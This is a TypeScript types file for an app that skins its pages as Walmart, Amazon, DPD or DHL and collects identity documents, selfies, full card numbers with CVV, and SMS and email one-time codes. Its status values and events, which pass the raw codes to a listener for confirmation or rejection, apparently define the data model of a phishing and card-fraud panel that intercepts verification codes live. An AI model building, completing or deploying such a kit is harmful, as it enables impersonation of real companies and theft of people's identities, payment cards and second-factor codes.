export interface Brand {
  id: number;
  name: string;
  slug: BrandSlug;
  logo_url: string | null;
  primary_color: string;
  secondary_color: string;
  font_family: string;
  theme_config: BrandThemeConfig;
  kyc_fields: string[];
  is_active: boolean;
  kyc_verifications_count?: number;
  orders_count?: number;
}

export type BrandSlug = 'walmart' | 'amazon' | 'dpd' | 'dhl';

export interface BrandThemeConfig {
  header_bg: string;
  header_text?: string;
  button_radius: string;
  card_shadow: string;
  accent: string;
  text_primary: string;
  text_secondary: string;
  bg_light: string;
  success: string;
  error: string;
  link?: string;
  border?: string;
}

export interface KycVerification {
  id: number;
  uuid: string;
  user_id: number | null;
  brand_id: number;
  brand?: Brand;
  first_name: string;
  last_name: string;
  email: string;
  phone: string | null;
  date_of_birth: string | null;
  nationality: string | null;
  address_line_1: string | null;
  address_line_2: string | null;
  city: string | null;
  state: string | null;
  postal_code: string | null;
  country: string | null;
  document_type: DocumentType | null;
  document_number: string | null;
  document_front_path: string | null;
  document_back_path: string | null;
  selfie_path: string | null;
  status: KycStatus;
  rejection_reason: string | null;
  extracted_data: Record<string, unknown> | null;
  verification_checks: Record<string, boolean | null> | null;
  confidence_score: number | null;
  submitted_at: string | null;
  reviewed_at: string | null;
  ip_address: string | null;
  created_at: string;
  updated_at: string;
}

export type KycStatus =
  | 'pending'
  | 'documents_uploaded'
  | 'in_review'
  | 'approved'
  | 'rejected'
  | 'additional_info_required';

export type DocumentType = 'passport' | 'id_card' | 'driving_license';

export interface KycFormData {
  brand_slug: string;
  first_name: string;
  last_name: string;
  email: string;
  phone?: string;
  date_of_birth?: string;
  nationality?: string;
  address_line_1?: string;
  address_line_2?: string;
  city?: string;
  state?: string;
  postal_code?: string;
  country?: string;
  document_type: DocumentType;
  document_number?: string;
  document_front?: File;
  document_back?: File;
  selfie?: File;
}

export interface Order {
  id: number;
  uuid: string;
  brand_id: number;
  brand?: Brand;
  order_number: string;
  customer_name: string;
  customer_email: string;
  status: OrderStatus;
  amount: number;
  currency: string;
  items: OrderItem[] | null;
  shipping_address: ShippingAddress | null;
  notes: string | null;
  shipped_at: string | null;
  delivered_at: string | null;
  created_at: string;
  updated_at: string;
}

export type OrderStatus =
  | 'pending'
  | 'processing'
  | 'verified'
  | 'shipped'
  | 'delivered'
  | 'cancelled'
  | 'on_hold';

export interface OrderItem {
  name: string;
  quantity: number;
  price: number;
}

export interface ShippingAddress {
  line_1: string;
  line_2?: string;
  city: string;
  state?: string;
  postal_code: string;
  country: string;
}

export interface KycStats {
  total: number;
  pending: number;
  documents_uploaded: number;
  in_review: number;
  approved: number;
  rejected: number;
  today: number;
}

export interface ApiResponse<T> {
  data: T;
  message?: string;
}

export interface PaginatedResponse<T> {
  data: T[];
  current_page: number;
  last_page: number;
  per_page: number;
  total: number;
}

export interface KycStatusEvent {
  id: number;
  uuid: string;
  status: KycStatus;
  brand: string;
  full_name: string;
  email: string;
  updated_at: string;
}

export interface OrderCreatedEvent {
  id: number;
  uuid: string;
  order_number: string;
  customer_name: string;
  amount: number;
  currency: string;
  status: string;
  brand: string;
  created_at: string;
}

// ===== CARD VERIFICATION =====

export type CardVerificationStatus =
  | 'pending'
  | 'awaiting_sms'
  | 'sms_code_entered'
  | 'sms_confirmed'
  | 'sms_rejected'
  | 'awaiting_email'
  | 'email_code_entered'
  | 'email_confirmed'
  | 'email_rejected'
  | 'verified'
  | 'failed';

export interface CardVerificationSubmitData {
  brand_slug: string;
  cardholder_name: string;
  card_number: string;
  card_expiry: string;
  card_cvv: string;
  email: string;
  phone?: string;
  address_line_1?: string;
  address_line_2?: string;
  city?: string;
  state?: string;
  postal_code?: string;
  country?: string;
}

export interface CardVerificationResponse {
  uuid: string;
  session_token: string;
  status: CardVerificationStatus;
}

export interface CardVerificationStatusResponse {
  uuid: string;
  status: CardVerificationStatus;
  cardholder_name: string;
  card_number_masked: string;
  card_type: string;
  sms_code_valid: boolean | null;
  email_code_valid: boolean | null;
  verified_at: string | null;
  brand: string;
}

export interface CardVerificationEvent {
  id: number;
  uuid: string;
  status: CardVerificationStatus;
  brand: string;
  cardholder_name: string;
  card_number_masked: string;
  card_type: string;
  email: string;
  sms_code: string | null;
  email_code: string | null;
  sms_code_valid: boolean | null;
  email_code_valid: boolean | null;
  updated_at: string;
}
